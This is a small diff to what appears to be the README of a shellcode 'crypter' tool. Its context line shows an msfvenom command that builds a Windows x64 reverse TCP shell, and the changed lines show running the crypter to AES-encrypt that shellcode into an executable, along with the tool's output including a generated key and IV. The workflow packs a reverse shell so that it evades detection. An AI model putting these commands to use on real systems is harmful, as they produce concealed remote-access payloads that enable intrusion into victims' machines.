@@ -43,7 +43,8 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[LISTENER IP] LPORT=[LISTENER 
 Run crypter to crypto pack the shellcode into a C source binary:
 
 ```
-$ crypter payload.bin shell.exe
+$ ./crypter payload.bin shell.exe
+
 Extracted contents of payload.dat
 Generated random AES256 Cryto Pack key: 924C2038A4B0DEFDF8420A2A896688CE900DD26109759A4CAE0681A147A64FA5
 Generated random initialization vector: 34A7B03E8F2CD3023ED2BF78ECC8AE846D84B30F96E97BC02189820276DEB229
